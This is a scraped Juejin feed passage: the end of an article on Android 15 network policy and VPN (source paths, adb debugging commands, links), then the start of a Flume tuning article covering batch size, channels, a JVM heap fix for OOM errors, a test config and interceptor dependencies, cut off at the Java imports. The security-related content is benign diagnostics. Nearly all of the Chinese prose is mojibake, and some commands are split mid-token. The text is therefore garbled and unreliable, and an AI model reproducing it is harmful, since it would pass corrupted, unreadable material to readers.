<table><thead><tr><th align="left">åœºæ™¯</th><th align="left">å»ºè®®</th></tr></thead><tbody><tr><td align="left">çœæµä¼˜åŒ–</td><td align="left">ç›‘å¬Data SaverçŠ¶æ€ï¼ŒåŠ¨æ€è°ƒæ•´èµ„æºè´¨é‡</td></tr><tr><td align="left">VPNå¼€å‘</td><td align="left">ä½¿ç”¨TUNè€ŒéTAPï¼Œå¤„ç†å¥½å¼‚å¸¸é‡è¿</td></tr><tr><td align="left">åå°åŒæ­¥</td><td align="left">ä½¿ç”¨WorkManager + ç½‘ç»œçº¦æŸæ¡ä»¶</td></tr><tr><td align="left">å¤§æ–‡ä»¶ä¸‹è½½</td><td align="left">åˆ†æ®µä¸‹è½½ï¼Œæ”¯æŒæ–­ç‚¹ç»­ä¼ ï¼ŒWiFiä¼˜å…ˆ</td></tr><tr><td align="left">å®æ—¶é€šä¿¡</td><td align="left">ä½¿ç”¨WebSocketä¿æŒé•¿è¿æ¥ï¼Œå¿ƒè·³ä¿æ´»</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-52">å…­ã€å‚è€ƒèµ„æº</h2>
<h3 data-id="heading-53">6.1 æºç è·¯å¾„</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># NetworkPolicy</span>
packages/modules/Connectivity/service/src/com/android/server/net/
â”œâ”€â”€ NetworkPolicyManagerService.java
â”œâ”€â”€ NetworkStatsService.java
â””â”€â”€ NetworkPolicyManagerInternal.java

<span class="hljs-comment"># VPN</span>
packages/modules/Connectivity/service/src/com/android/server/connectivity/
â”œâ”€â”€ Vpn.java
â””â”€â”€ VpnNetworkObserver.java

<span class="hljs-comment"># eBPF</span>
system/netd/bpf_progs/
â”œâ”€â”€ netd.c
â””â”€â”€ bpf_net_helpers.h
</code></pre>
<h3 data-id="heading-54">6.2 è°ƒè¯•å‘½ä»¤</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ç½‘ç»œç­–ç•¥</span>
adb shell dumpsys network_policy

<span class="hljs-comment"># æµé‡ç»Ÿè®¡</span>
adb shell dumpsys netstats

<span class="hljs-comment"># VPNçŠ¶æ€</span>
adb shell dumpsys connectivity | grep -A 20 <span class="hljs-string">"VPN"</span>

<span class="hljs-comment"># eBPFç»Ÿè®¡</span>
adb shell dumpsys connectivity trafficcontroller

<span class="hljs-comment"># è®¾ç½®Data Saver</span>
adb shell cmd netpolicy <span class="hljs-built_in">set</span> restrict-background <span class="hljs-literal">true</span>

<span class="hljs-comment"># æŸ¥çœ‹UIDç­–ç•¥</span>
adb shell cmd netpolicy list uid-policy
</code></pre>
<h3 data-id="heading-55">6.3 å®˜æ–¹æ–‡æ¡£</h3>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Freference%2Fandroid%2Fnet%2FVpnService" target="_blank" title="https://developer.android.com/reference/android/net/VpnService" ref="nofollow noopener noreferrer">VpnService Guide</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Ftraining%2Fbasics%2Fnetwork-ops%2Fdata-saver" target="_blank" title="https://developer.android.com/training/basics/network-ops/data-saver" ref="nofollow noopener noreferrer">Data Saver Best Practices</a></li>
</ul>
<hr/>
<h2 data-id="heading-56">åè®°</h2>
<p>ç½‘ç»œç­–ç•¥å’ŒVPNæ˜¯Androidç½‘ç»œå­ç³»ç»Ÿä¸­æœ€å¤æ‚çš„ä¸¤ä¸ªæ¨¡å—ï¼Œå®ƒä»¬å…±åŒä¿éšœäº†ï¼š</p>
<ul>
<li><strong>ç”¨æˆ·éšç§</strong>ï¼šVPNåŠ å¯†ä¿æŠ¤æ•°æ®ä¼ è¾“</li>
<li><strong>æµé‡æ§åˆ¶</strong>ï¼šé˜²æ­¢åå°åº”ç”¨å·è·‘æµé‡</li>
<li><strong>ç”µé‡ä¼˜åŒ–</strong>ï¼šé™åˆ¶ä¸å¿…è¦çš„ç½‘ç»œæ´»åŠ¨</li>
<li><strong>å®‰å…¨éš”ç¦»</strong>ï¼šä¼ä¸šçº§ç½‘ç»œè®¿é—®æ§åˆ¶</li>
</ul>
<h3 data-id="heading-57">ç³»åˆ—æ–‡ç« </h3>
<ul>
<li><a href="https://juejin.cn/post/7600060691350405162" target="_blank" title="https://juejin.cn/post/7600060691350405162">ä¸Šä¸€ç¯‡ï¼šAndroid 15ç½‘ç»œå­ç³»ç»Ÿæ·±åº¦è§£æï¼ˆä¸€ï¼‰ï¼šConnectivityServiceä¸ç½‘ç»œç®¡ç†æ¡†æ¶å…¨è§£æ</a></li>
</ul>
<hr/>
<p><em>æ¬¢è¿æ¥æˆ‘ä¸­çš„<a href="https://link.juejin.cn?target=https%3A%2F%2Fhome.wonlab.top" target="_blank" title="https://home.wonlab.top" ref="nofollow noopener noreferrer">ä¸ªäººä¸»é¡µ</a>æ‰¾åˆ°æ›´å¤šæœ‰ç”¨çš„çŸ¥è¯†å’Œæœ‰è¶£çš„äº§å“</em></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¤§æ•°æ®-226 ç¦»çº¿æ•°ä»“Flume ä¼˜åŒ–é…ç½®å®æˆ˜ï¼šbatchSize/Channel/å‹ç¼©/è‡ªå®šä¹‰æ‹¦æˆªå™¨ä¸ OOM ä¿®å¤]]></title>    <link>https://juejin.cn/post/7601007650722627625</link>    <guid>https://juejin.cn/post/7601007650722627625</guid>    <pubDate>2026-01-30T13:06:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7601007650722627625" data-draft-id="7600964907489460230" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¤§æ•°æ®-226 ç¦»çº¿æ•°ä»“Flume ä¼˜åŒ–é…ç½®å®æˆ˜ï¼šbatchSize/Channel/å‹ç¼©/è‡ªå®šä¹‰æ‹¦æˆªå™¨ä¸ OOM ä¿®å¤"/> <meta itemprop="keywords" content="åç«¯,å¤§æ•°æ®,Apache Flume"/> <meta itemprop="datePublished" content="2026-01-30T13:06:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ­¦å­åº·"/> <meta itemprop="url" content="https://juejin.cn/user/149189314230039"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¤§æ•°æ®-226 ç¦»çº¿æ•°ä»“Flume ä¼˜åŒ–é…ç½®å®æˆ˜ï¼šbatchSize/Channel/å‹ç¼©/è‡ªå®šä¹‰æ‹¦æˆªå™¨ä¸ OOM ä¿®å¤
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/149189314230039/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ­¦å­åº·
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T13:06:40.000Z" title="Fri Jan 30 2026 13:06:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">TL;DR</h2>
<ul>
<li>åœºæ™¯ï¼šç¦»çº¿æ•°ä»“é‡‡é›†æ—¥å¿—å†™å…¥ HDFSï¼ŒFlume Agent ååã€ç¨³å®šæ€§ä¸è½ç›˜åˆ†åŒºæ—¶é—´å‡†ç¡®æ€§éœ€è¦åŒæ—¶ä¿è¯</li>
<li>ç»“è®ºï¼šä¼˜å…ˆç”¨æ‰¹é‡å‚æ•°ä¸ Channel å®¹é‡/äº‹åŠ¡é…åˆæå‡ååï¼Œç”¨ JVM å †å‚æ•°è§£å†³ OOMï¼Œç”¨æ‹¦æˆªå™¨æŠŠä¸šåŠ¡æ—¶é—´å†™å…¥ header ä¿®æ­£åˆ†åŒºè·¯å¾„</li>
<li>äº§å‡ºï¼šå¯å¤ç”¨çš„ Flume 1.9.0 è°ƒä¼˜æ¸…å• + OOM é€Ÿä¿®å‘½ä»¤ + è‡ªå®šä¹‰ Interceptorï¼ˆlogtime headerï¼‰è½åœ°æ¨¡æ¿</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a3d97f77496343d09c16b141f957d25d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770383200&amp;x-signature=SP7uSvZn3cNPYjDqPoruTfNc9HU%3D" alt="å¤§æ•°æ®-226 ç¦»çº¿æ•°ä»“Flume ä¼˜åŒ–é…ç½®å®æˆ˜ï¼šbatchSize/Channel/å‹ç¼©/è‡ªå®šä¹‰æ‹¦æˆªå™¨ä¸ OOM ä¿®å¤" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/eaa267bad42548c9902abdbda8746372~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770383200&amp;x-signature=mpsWZqpBOJzS0yK7Rv3m2X1Tgw8%3D" alt="ç¦»çº¿æ•°ä»“æ¶æ„å›¾" loading="lazy"/></p>
<h2 data-id="heading-1">Flumeçš„ä¼˜åŒ–é…ç½®</h2>
<p>Flume æ˜¯ä¸€ç§åˆ†å¸ƒå¼ã€å¯é ä¸”é«˜æ•ˆçš„æ•°æ®æ”¶é›†ã€èšåˆå’Œä¼ è¾“ç³»ç»Ÿï¼Œå¹¿æ³›åº”ç”¨äºå¤§æ•°æ®ç”Ÿæ€ç³»ç»Ÿä¸­ã€‚ä¸ºäº†æå‡ Flume çš„æ€§èƒ½å’Œç¨³å®šæ€§ï¼Œä¼˜åŒ–é…ç½®è‡³å…³é‡è¦ã€‚</p>
<p>ä½¿ç”¨å¦‚ä¸‹çš„æŒ‡ä»¤ï¼Œå¯åŠ¨Agentè¿›è¡Œæµ‹è¯•ï¼š</p>
<pre><code class="hljs language-shell" lang="shell">flume-ng agent --conf-file /opt/wzk/flume-conf/flume-log2hdfs1.conf -name a1 -Dflum
e.roog.logger=INFO,console
</code></pre>
<p>å¯åŠ¨åçš„æˆªå›¾å¦‚ä¸‹æ‰€ç¤ºï¼š
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4aae07ec211e4a13858f881ee1c5be2b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770383200&amp;x-signature=JOCWv0y6btJ3um%2Fq8MiOd5h2lAY%3D" alt="ç¦»çº¿æ•°ä»“Flumeå¯åŠ¨" loading="lazy"/></p>
<p>æŸ¥çœ‹åˆšæ‰çš„Flumeçª—å£ï¼š
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b3dd8c226b17487d8114d3bce1656863~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770383200&amp;x-signature=SGMi36RywTLV%2F0n23VLvNgjkunU%3D" alt="ç¦»çº¿æ•°ä»“Flumeæ—¥å¿—" loading="lazy"/></p>
<p>æŸ¥çœ‹HDFSçš„å†…å®¹ï¼š
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c798bd4cc37540f581aaed1a0852d835~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770383200&amp;x-signature=nScgFdIfyY0v8HPmczsbZ5J2TMk%3D" alt="ç¦»çº¿æ•°ä»“ HDFS å†…å®¹" loading="lazy"/></p>
<h3 data-id="heading-2">æ‰¹é‡å¤„ç†</h3>
<ul>
<li>å‚æ•°ï¼šbatchSize</li>
<li>ä½œç”¨ï¼šæ§åˆ¶ Flume åœ¨æ‰¹é‡ä¼ è¾“æ—¶æ¯æ¬¡ä¼ è¾“çš„äº‹ä»¶æ•°é‡ã€‚
é…ç½®å»ºè®®ï¼š</li>
<li>Source åˆ° Channelï¼šæ ¹æ® Source çš„ååé‡å’Œ Channel çš„ååèƒ½åŠ›è°ƒæ•´ï¼Œæ¨èå€¼ä¸º 100-1000ã€‚</li>
<li>Channel åˆ° Sinkï¼šæ ¹æ® Sink çš„å¤„ç†èƒ½åŠ›å’Œç›®æ ‡ç³»ç»Ÿçš„å†™å…¥æ€§èƒ½è°ƒæ•´ï¼Œæ¨èå€¼ä¸º 500-5000ã€‚</li>
</ul>
<h3 data-id="heading-3">å‹ç¼©ä¼ è¾“</h3>
<ul>
<li>å‚æ•°ï¼šcompressionType</li>
<li>ä½œç”¨ï¼šå¯¹äº‹ä»¶è¿›è¡Œå‹ç¼©åä¼ è¾“ï¼Œå‡å°‘ç½‘ç»œå¸¦å®½æ¶ˆè€—ã€‚</li>
<li>æ”¯æŒçš„å‹ç¼©ç±»å‹ï¼šgzipã€snappyã€lz4 ç­‰ã€‚</li>
<li>é…ç½®å»ºè®®ï¼šæ ¹æ®ç›®æ ‡ç³»ç»Ÿæ˜¯å¦æ”¯æŒè§£å‹ç¼©åŠŸèƒ½é€‰æ‹©åˆé€‚çš„å‹ç¼©ç±»å‹ã€‚</li>
</ul>
<h3 data-id="heading-4">Source ä¼˜åŒ–</h3>
<h4 data-id="heading-5">Taildir Source</h4>
<ul>
<li>å‚æ•°ï¼šbatchSize å’Œ fileHeader</li>
<li>batchSizeï¼šè®¾ç½®å•æ¬¡ä»æ–‡ä»¶ä¸­è¯»å–çš„äº‹ä»¶æ•°é‡ã€‚</li>
<li>fileHeaderï¼šæ˜¯å¦åœ¨äº‹ä»¶å¤´éƒ¨æ·»åŠ æ–‡ä»¶åï¼Œæ¨èå¼€å¯ä»¥ä¾¿äºåç»­å¤„ç†ã€‚</li>
</ul>
<h4 data-id="heading-6">Kafka Source</h4>
<ul>
<li>å‚æ•°ï¼škafka.consumer.timeout.ms å’Œ fetch.message.max.bytes</li>
<li>kafka.consumer.timeout.msï¼šè®¾ç½® Kafka æ¶ˆè´¹è€…è¯»å–æ•°æ®çš„è¶…æ—¶æ—¶é—´ï¼Œé€šå¸¸ä¸º 100-500msã€‚</li>
<li>fetch.message.max.bytesï¼šè®¾ç½®æ¯æ¬¡è¯»å–çš„æœ€å¤§æ¶ˆæ¯å¤§å°ï¼Œé»˜è®¤å€¼é€šå¸¸ä¸º 1MBï¼Œå¯ä»¥æ ¹æ®ä¸šåŠ¡åœºæ™¯é€‚å½“è°ƒæ•´ã€‚</li>
</ul>
<h3 data-id="heading-7">Channel ä¼˜åŒ–</h3>
<h4 data-id="heading-8">Memory Channel</h4>
<ul>
<li>å‚æ•°ï¼šcapacity å’Œ transactionCapacity</li>
<li>capacityï¼šChannel ä¸­å…è®¸çš„æœ€å¤§äº‹ä»¶æ•°ã€‚</li>
<li>transactionCapacityï¼šå•æ¬¡äº‹åŠ¡ä¸­å…è®¸çš„æœ€å¤§äº‹ä»¶æ•°ã€‚</li>
</ul>
<h4 data-id="heading-9">File Channel</h4>
<ul>
<li>å‚æ•°ï¼šcheckpointDir å’Œ dataDirs</li>
<li>checkpointDirï¼šå­˜å‚¨ Channel çŠ¶æ€çš„ç›®å½•ã€‚</li>
<li>dataDirsï¼šå­˜å‚¨äº‹ä»¶æ•°æ®çš„ç›®å½•ï¼Œå»ºè®®è®¾ç½®å¤šä¸ªç£ç›˜è·¯å¾„ä»¥æå‡ IO æ€§èƒ½ã€‚</li>
<li>é…ç½®å»ºè®®ï¼šç¡®ä¿ç£ç›˜ IO æ€§èƒ½è¶³å¤Ÿï¼Œé¿å…ç“¶é¢ˆã€‚</li>
</ul>
<h2 data-id="heading-10">FlumeæŠ¥é”™è§£å†³</h2>
<p>å‘ logs ç›®å½•ä¸­å­˜æ”¾å…¥æ—¥å¿—æ–‡ä»¶ï¼Œæ­¤æ—¶å¦‚æœå‡ºç°OOMçš„æ—¥å¿—ï¼Œæ˜¯å› ä¸ºç¼ºçœæƒ…å†µä¸‹FlumeJVMçš„æœ€å¤§åˆ†é…20Mï¼Œè¿™ä¸ªå€¼å¤ªå°ï¼Œéœ€è¦è°ƒæ•´ã€‚
æˆ‘è¿™é‡Œç›´æ¥æ”¾å…¥ï¼š</p>
<pre><code class="hljs language-shell" lang="shell">vim /opt/wzk/logs/start/test.log

2020-07-30 14:18:47.339 [main] INFO com.ecommerce.AppStart - {"app_active":{"name":"app_active","json":{"entry":"1","action":"1","error_code":"0"},"time":1596111888529},"attr":{"area":"æ³°å®‰","uid":"2F10092A9","app_v":"1.1.13","event_type":"common","device_id":"1FB872-9A1009","os_type":"4.7.3","channel":"DK","language":"chinese","brand":"iphone-9"}}

</code></pre>
<p>è§£å†³æ–¹æ¡ˆï¼š
åœ¨ $FLUME_HOME/conf/flume-env.sh ä¸­å¢åŠ ä»¥ä¸‹å†…å®¹:</p>
<pre><code class="hljs language-shell" lang="shell">export JAVA_OPTS="-Xms4000m -Xmx4000m -
Dcom.sun.management.jmxremote"
<span class="hljs-meta prompt_"># </span><span class="bash">è¦æƒ³ä½¿é…ç½®æ–‡ä»¶ç”Ÿæ•ˆï¼Œè¿˜è¦åœ¨å‘½ä»¤è¡Œä¸­æŒ‡å®šé…ç½®æ–‡ä»¶ç›®å½•</span>
flume-ng agent --conf flume-1.9/conf --conf-file flume-log2hdfs1.conf -name a1 -Dflume.root.logger=INFO,console

flume-ng agent --conf-file flume-log2hdfs1.conf -name a1 -Dflume.root.logger=INFO,console
</code></pre>
<p>Flumeå†…å­˜å‚æ•°è®¾ç½®åŠä¼˜åŒ–ï¼š</p>
<ul>
<li>æ ¹æ®æ—¥å¿—æ•°æ®é‡å¤§å°ï¼ŒJVMå †ä¸€èˆ¬è¦è®¾ç½®ä¸º4Gæˆ–è€…æ›´é«˜</li>
<li>-Xms -Xmxæœ€å¥½è®¾ç½®ä¸€è‡´ï¼Œå‡å°‘å†…å­˜æŠ–åŠ¨å¸¦æ¥çš„æ€§èƒ½å½±å“</li>
</ul>
<h2 data-id="heading-11">è‡ªå®šä¹‰æ‹¦æˆªå™¨</h2>
<p>å‰é¢FlumeAgentçš„é…ç½®ä½¿ç”¨äº†æœ¬åœ°æ—¶é—´ï¼Œå¯èƒ½å¯¼è‡´æ•°æ®å­˜æ”¾çš„è·¯å¾„ä¸æ­£ç¡®ã€‚è¦è§£å†³ä¸Šé¢çš„é—®é¢˜å°±éœ€è¦ä½¿ç”¨è‡ªå®šä¹‰æ‹¦æˆªå™¨ã€‚
Agentç”¨äºæµ‹è¯•è‡ªå®šä¹‰æ‹¦æˆªå™¨ï¼Œsource =&gt; logger sink
flumetest1.conf</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">a1æ˜¯agentçš„åç§°ã€‚<span class="hljs-built_in">source</span>ã€channelã€sinkçš„åç§°åˆ†åˆ«ä¸ºï¼šr1 c1 k1</span>
a1.sources = r1
a1.channels = c1
a1.sinks = k1
<span class="hljs-meta prompt_"># </span><span class="bash"><span class="hljs-built_in">source</span></span>
a1.sources.r1.type = netcat
a1.sources.r1.bind = h122.wzk.icu
a1.sources.r1.port = 9999
a1.sources.r1.interceptors = i1
a1.sources.r1.interceptors.i1.type = icu.wzk.CustomerInterceptor$Builder
<span class="hljs-meta prompt_"># </span><span class="bash">channel</span>
a1.channels.c1.type = memory
a1.channels.c1.capacity = 10000
a1.channels.c1.transactionCapacity = 100
<span class="hljs-meta prompt_"># </span><span class="bash">sink</span>
a1.sinks.k1.type = logger
<span class="hljs-meta prompt_"># </span><span class="bash"><span class="hljs-built_in">source</span>ã€channelã€sinkä¹‹é—´çš„å…³ç³»</span>
a1.sources.r1.channels = c1
a1.sinks.k1.channel = c1
</code></pre>
<h3 data-id="heading-12">è‡ªå®šä¹‰æ‹¦æˆªå™¨åŸç†</h3>
<p>è‡ªå®šä¹‰æ‹¦æˆªå™¨çš„åŸç†ï¼š</p>
<ul>
<li>è‡ªå®šä¹‰æ‹¦æˆªå™¨è¦é›†æˆ Flume çš„ Interceptor</li>
<li>Event åˆ†ä¸º header å’Œ body ï¼ˆæ¥æ”¶çš„å­—ç¬¦ä¸²ï¼‰</li>
<li>è·å– header å’Œ body</li>
<li>ä» body ä¸­ è·å– timeï¼Œå¹¶å°†æ—¶é—´æˆ³è½¬æ¢ä¸ºå­—ç¬¦ä¸² yyyy-MM-dd</li>
<li>å°†è½¬æ¢åçš„å­—ç¬¦ä¸²æ”¾ç½®åˆ°headerä¸­</li>
</ul>
<h3 data-id="heading-13">è‡ªå®šä¹‰æ‹¦æˆªå™¨å®ç°</h3>
<p>è‡ªå®šä¹‰æ‹¦æˆªå™¨çš„å®ç°ï¼š</p>
<ul>
<li>è·å–eventçš„header</li>
<li>è·å–eventçš„body</li>
<li>è§£æbodyè·å–jsonä¸²</li>
<li>è§£æjsonä¸²è·å–æ—¶é—´æˆ³</li>
<li>å°†æ—¶é—´æˆ³è½¬æ¢ä¸ºå­—ç¬¦ä¸² yyyy-MM-dd</li>
<li>å°†è½¬æ¢åçš„å­—ç¬¦ä¸²æ”¾ç½®headerä¸­</li>
<li>è¿”å›event</li>
</ul>
<h3 data-id="heading-14">å¯¼å…¥ä¾èµ–</h3>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.flume<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>flume-ng-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.9.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>provided<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>fastjson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.1.23<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span>
</code></pre>
<h3 data-id="heading-15">ç¼–å†™ä»£ç </h3>
<pre><code class="hljs language-shell" lang="shell">package icu.wzk;


import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import org.apache.flume.Context;
import org.apache.flume.Event;
import org.apache.flume.interceptor.Interceptor;

import java.nio.charset.StandardCharsets;
import java.time.Instant;
import java.time.LocalDateTime;
import java.time.ZoneId;
import java.time.format.DateTimeFormatter;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;

